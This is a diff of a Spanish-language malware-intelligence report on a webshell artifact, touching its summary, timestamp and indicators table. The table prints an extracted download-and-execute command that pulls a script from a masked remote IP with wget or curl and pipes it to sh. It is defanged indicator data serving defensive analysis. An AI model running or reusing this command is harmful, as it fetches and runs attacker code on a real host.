@@ -4,7 +4,8 @@
 
 ## 📌 Resumen
 
-Artefacto asociado a la familia **webshell** con evidencia suficiente para atribución. Comportamientos destacados: Descarga remota, Ejecución. Se asoció 1 comando observado o extraído.
+Artefacto asociado a la familia **webshell** con evidencia suficiente para atribución. Comportamientos destacados: Descarga remota, Ejecución. Se identificó 1 comando observado o extraído. Se identificaron 6 indicadores técnicos.
+
 
 ## 🏷️ Clasificación
 
@@ -15,7 +16,7 @@ Artefacto asociado a la familia **webshell** con evidencia suficiente para atrib
 
 ## 🗓️ Registro
 
-- **Registrado:** `2026-08-09T21:09:22+00:00`
+- **Registrado:** `2026-08-09T21:09:22.000000Z`
 - **Tipo de registro:** `snapshot inmutable`
 
 ## 🔐 Identidad
@@ -53,12 +54,12 @@ echo (wget --no-check-certificate -qO- hxxps://14.46.136.XXX/sh || curl -sk hxxp
 
 | Tipo | Valor | Contexto |
 | --- | --- | --- |
-| ip | 14.46.136.XXX | static_analysis |
-| ip | 190.179.166.XXX | static_analysis |
 | url | hxxps://14.46.136.XXX/sh | strings |
 | url | hxxps://14.46.136.XXX/sh) | strings |
-| hash | a60e77108ca25a957a55d238344f8791c3348fb20cca6a83672b307beacd5874 | static_analysis |
+| ip | 14.46.136.XXX | static_analysis |
+| ip | 190.179.166.XXX | static_analysis |
 | command | echo (wget --no-check-certificate -qO- hxxps://14.46.136.XXX/sh \|\| curl -sk hxxps://14.46.136.XXX/sh) \| sh -s apache.selfr | strings |
+| hash | a60e77108ca25a957a55d238344f8791c3348fb20cca6a83672b307beacd5874 | static_analysis |
 | ip | 107.167.94.XXX | artifact_source |
 
 ## 🔎 Triage
